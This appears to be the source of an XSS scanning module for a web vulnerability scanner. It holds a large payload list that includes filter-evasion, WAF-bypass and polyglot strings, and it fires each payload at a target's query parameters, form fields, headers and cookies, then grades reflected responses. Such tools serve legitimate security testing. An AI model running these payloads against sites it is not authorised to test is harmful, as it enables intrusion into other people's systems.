# backend/attacks/xss.py
import aiohttp
import asyncio
import urllib.parse
import re
import html
import logging
from typing import List, Dict, Any
from dataclasses import dataclass

logger = logging.getLogger(__name__)

@dataclass
class Vulnerability:
    type: str
    severity: str
    parameter: str
    payload: str
    evidence: str
    description: str

class XSSAttack:
    def __init__(self):
        self.payloads = [
            # Basic XSS payloads
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            
            # Event handler payloads
            "' onmouseover='alert(1)'",
            '" onmouseover="alert(1)"',
            "javascript:alert('XSS')",
            "vbscript:alert('XSS')",
            
            # HTML entity encoded
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            
            # Filter evasion techniques
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>alert(/XSS/.source)</script>",
            "<script>alert(1337)</script>",
            
            # Attribute injection
            "' autofocus onfocus=alert(1) x='",
            '" autofocus onfocus=alert(1) x="',
            "' accesskey=x onclick=alert(1) x='",
            
            # CSS-based XSS
            "<style>@import'javascript:alert(\"XSS\")';</style>",
            "<link rel=stylesheet href=javascript:alert('XSS')>",
            "<style>body{background:url(javascript:alert('XSS'))}</style>",
            
            # Advanced payloads
            "<object data=javascript:alert('XSS')>",
            "<embed src=javascript:alert('XSS')>",
            "<applet code=javascript:alert('XSS')>",
            "<meta http-equiv=refresh content=0;url=javascript:alert('XSS')>",
            
            # Polyglot payloads
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
            
            # Context-specific payloads
            "</script><script>alert('XSS')</script>",
            "</textarea><script>alert('XSS')</script>",
            "</title><script>alert('XSS')</script>",
            
            # WAF bypass attempts
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "<script>al\\u0065rt('XSS')</script>",
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
            
            # DOM-based XSS
            "#<script>alert('XSS')</script>",
            "data:text/html,<script>alert('XSS')</script>",
            
            # Angular.js specific
            "{{constructor.constructor('alert(1)')()}}",
            "{{$new.constructor('alert(1)')()}}",
            "ng-focus=$event.path|orderBy:'[].constructor.from([1],alert)'",
            
            # React specific
            "javascript:/*</script><svg/onload='*/alert(\"XSS\")'>",
            
            # Template injection attempts
            "${alert('XSS')}",
            "#{alert('XSS')}",
            "{{alert('XSS')}}",
        ]
        
        self.contexts = [
            'html',      # Between HTML tags
            'attribute', # Inside HTML attributes
            'script',    # Inside script tags
            'style',     # Inside style tags
            'url',       # In URL parameters
        ]

    async def execute(self, target_url: str, parameters: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Execute XSS attack against target URL"""
        vulnerabilities = []
        
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30)) as session:
                # Test GET parameters
                get_vulns = await self._test_get_parameters(session, target_url)
                vulnerabilities.extend(get_vulns)
                
                # Test POST parameters
                post_vulns = await self._test_post_parameters(session, target_url, parameters)
                vulnerabilities.extend(post_vulns)
                
                # Test headers
                header_vulns = await self._test_headers(session, target_url)
                vulnerabilities.extend(header_vulns)
                
                # Test cookies
                cookie_vulns = await self._test_cookies(session, target_url)
                vulnerabilities.extend(cookie_vulns)
                
        except Exception as e:
            logger.error(f"XSS attack failed: {str(e)}")
            
        return [vuln.__dict__ if hasattr(vuln, '__dict__') else vuln for vuln in vulnerabilities]

    async def _test_get_parameters(self, session: aiohttp.ClientSession, target_url: str) -> List[Vulnerability]:
        """Test GET parameters for XSS"""
        vulnerabilities = []
        
        try:
            parsed_url = urllib.parse.urlparse(target_url)
            query_params = urllib.parse.parse_qs(parsed_url.query)
            
            # If no existing parameters, try common ones
            if not query_params:
                query_params = {
                    'search': ['test'],
                    'q': ['test'],
                    'query': ['test'],
                    'name': ['test'],
                    'message': ['test']
                }
            
            for param_name, param_values in query_params.items():
                for payload in self.payloads:
                    modified_params = query_params.copy()
                    modified_params[param_name] = [payload]
                    
                    new_query = urllib.parse.urlencode(modified_params, doseq=True)
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
                    
                    vulnerability = await self._send_payload_request(
                        session, test_url, "GET", param_name, payload
                    )
                    
                    if vulnerability:
                        vulnerabilities.append(vulnerability)
                        
        except Exception as e:
            logger.error(f"GET parameter XSS testing failed: {str(e)}")
            
        return vulnerabilities

    async def _test_post_parameters(self, session: aiohttp.ClientSession, target_url: str, parameters: Dict[str, Any]) -> List[Vulnerability]:
        """Test POST parameters for XSS"""
        vulnerabilities = []
        
        if not parameters:
            parameters = {
                'comment': 'test comment',
                'message': 'test message',
                'name': 'test name',
                'email': 'test@example.com',
                'content': 'test content'
            }
        
        try:
            for param_name, original_value in parameters.items():
                for payload in self.payloads:
                    modified_params = parameters.copy()
                    modified_params[param_name] = payload
                    
                    vulnerability = await self._send_payload_request(
                        session, target_url, "POST", param_name, payload, data=modified_params
                    )
                    
                    if vulnerability:
                        vulnerabilities.append(vulnerability)
                        
        except Exception as e:
            logger.error(f"POST parameter XSS testing failed: {str(e)}")
            
        return vulnerabilities

    async def _test_headers(self, session: aiohttp.ClientSession, target_url: str) -> List[Vulnerability]:
        """Test HTTP headers for XSS"""
        vulnerabilities = []
        
        test_headers = [
            'User-Agent',
            'Referer',
            'X-Forwarded-For',
            'X-Real-IP',
            'Accept-Language'
        ]
        
        try:
            for header_name in test_headers:
                # Test a subset of payloads for headers
                for payload in self.payloads[:10]:
                    headers = {header_name: payload}
                    
                    vulnerability = await self._send_payload_request(
                        session, target_url, "GET", header_name, payload, headers=headers
                    )
                    
                    if vulnerability:
                        vulnerabilities.append(vulnerability)
                        
        except Exception as e:
            logger.error(f"Header XSS testing failed: {str(e)}")
            
        return vulnerabilities

    async def _test_cookies(self, session: aiohttp.ClientSession, target_url: str) -> List[Vulnerability]:
        """Test cookies for XSS"""
        vulnerabilities = []
        
        try:
            for payload in self.payloads[:5]:  # Test subset for cookies
                cookies = {
                    'test_cookie': payload,
                    'user_pref': payload,
                    'session_data': payload
                }
                
                vulnerability = await self._send_payload_request(
                    session, target_url, "GET", "cookie", payload, cookies=cookies
                )
                
                if vulnerability:
                    vulnerabilities.append(vulnerability)
                    
        except Exception as e:
            logger.error(f"Cookie XSS testing failed: {str(e)}")
            
        return vulnerabilities

    async def _send_payload_request(
        self, 
        session: aiohttp.ClientSession, 
        url: str, 
        method: str, 
        param_name: str, 
        payload: str,
        data: Dict = None,
        headers: Dict = None,
        cookies: Dict = None
    ) -> Vulnerability:
        """Send request with XSS payload and analyze response"""
        
        try:
            if method == "GET":
                async with session.get(url, headers=headers, cookies=cookies) as response:
                    response_text = await response.text()
                    status_code = response.status
            else:
                async with session.post(url, data=data, headers=headers, cookies=cookies) as response:
                    response_text = await response.text()
                    status_code = response.status
                    
            vulnerability = self._analyze_xss_response(
                response_text, status_code, param_name, payload
            )
            
            return vulnerability
            
        except Exception as e:
            logger.debug(f"XSS request failed for payload {payload}: {str(e)}")
            return None

    def _analyze_xss_response(self, response_text: str, status_code: int, param_name: str, payload: str) -> Vulnerability:
        """Analyze response for XSS vulnerabilities"""
        
        # Check if payload is reflected in response
        if payload in response_text:
            context = self._determine_context(response_text, payload)
            severity = self._calculate_xss_severity(payload, context)
            
            return Vulnerability(
                type="Cross-Site Scripting (XSS)",
                severity=severity,
                parameter=param_name,
                payload=payload,
                evidence=f"Payload reflected in {context} context",
                description=f"Reflected XSS vulnerability detected in {context} context. The application includes user input in the response without proper sanitization, allowing script execution."
            )
        
        # Check for HTML-encoded payload reflection
        encoded_payload = html.escape(payload)
        if encoded_payload in response_text and payload not in response_text:
            return Vulnerability(
                type="Cross-Site Scripting (XSS)",
                severity="medium",
                parameter=param_name,
                payload=payload,
                evidence="HTML-encoded payload reflected - potential filter bypass",
                description="Potential XSS vulnerability detected. The payload is HTML-encoded but still reflected, which may be bypassable with encoding techniques."
            )
        
        # Check for partial payload reflection
        payload_parts = re.findall(r'<[^>]+>|alert|script|javascript', payload, re.IGNORECASE)
        reflected_parts = sum(1 for part in payload_parts if part.lower() in response_text.lower())
        
        if reflected_parts > 0:
            return Vulnerability(
                type="Cross-Site Scripting (XSS)",
                severity="low",
                parameter=param_name,
                payload=payload,
                evidence=f"Partial payload reflection detected ({reflected_parts}/{len(payload_parts)} parts)",
                description="Potential XSS vulnerability detected. Parts of the payload are reflected in the response, suggesting incomplete filtering."
            )
        
        # Check for JavaScript execution context indicators
        js_contexts = [
            r'var\s+\w+\s*=\s*["\'].*?' + re.escape(payload[:10]),
            r'<script[^>]*>.*?' + re.escape(payload[:10]),
            r'javascript:[^"\']*' + re.escape(payload[:10])
        ]
        
        for pattern in js_contexts:
            if re.search(pattern, response_text, re.IGNORECASE | re.DOTALL):
                return Vulnerability(
                    type="Cross-Site Scripting (XSS)",
                    severity="high",
                    parameter=param_name,
                    payload=payload,
                    evidence="Payload detected in JavaScript execution context",
                    description="High-risk XSS vulnerability detected. User input is included in a JavaScript execution context, potentially allowing immediate script execution."
                )
        
        return None

    def _determine_context(self, response_text: str, payload: str) -> str:
        """Determine the context where the payload appears"""
        
        # Find payload position in response
        payload_pos = response_text.find(payload)
        if payload_pos == -1:
            return "unknown"
        
        # Extract surrounding context
        context_start = max(0, payload_pos - 100)
        context_end = min(len(response_text), payload_pos + len(payload) + 100)
        context = response_text[context_start:context_end]
        
        # Analyze context
        if re.search(r'<script[^>]*>.*?' + re.escape(payload), context, re.IGNORECASE | re.DOTALL):
            return "script"
        elif re.search(r'<style[^>]*>.*?' + re.escape(payload), context, re.IGNORECASE | re.DOTALL):
            return "style"
        elif re.search(r'<[^>]*\s+\w+\s*=\s*["\'][^"\']*' + re.escape(payload), context, re.IGNORECASE):
            return "attribute"
        elif re.search(r'javascript:[^"\']*' + re.escape(payload), context, re.IGNORECASE):
            return "url"
        else:
            return "html"

    def _calculate_xss_severity(self, payload: str, context: str) -> str:
        """Calculate XSS severity based on payload and context"""
        
        # High severity conditions
        if context in ['script', 'url']:
            return "critical"
        
        if any(dangerous in payload.lower() for dangerous in ['alert', 'eval', 'document.cookie', 'window.location']):
            return "high"
        
        # Medium severity
        if context == "attribute":
            return "medium"
        
        if any(tag in payload.lower() for tag in ['<script', '<iframe', '<object', '<embed']):
            return "high"
        
        # Low severity - basic HTML context
        return "medium"